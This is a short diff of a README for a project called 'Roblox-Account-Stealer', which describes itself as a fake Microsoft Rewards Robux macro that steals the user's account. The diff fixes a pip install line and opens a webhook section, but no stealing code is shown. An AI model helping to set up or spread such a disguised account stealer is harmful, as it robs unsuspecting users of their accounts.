@@ -1,7 +1,7 @@
 # Roblox-Account-Stealer
 It acts as a macro for the Microsoft Reward Robux claim system but its a Bot that steal your account
 Steps to run:
-``` pip install pip install argparse json logging pycryptodome selenium pynput webdriver_manager```
+``` pip install argparse json logging pycryptodome selenium pynput webdriver_manager```
 Webwook:
 ```
  parser = argparse.ArgumentParser(description="Microsoft Rewards Farmer")
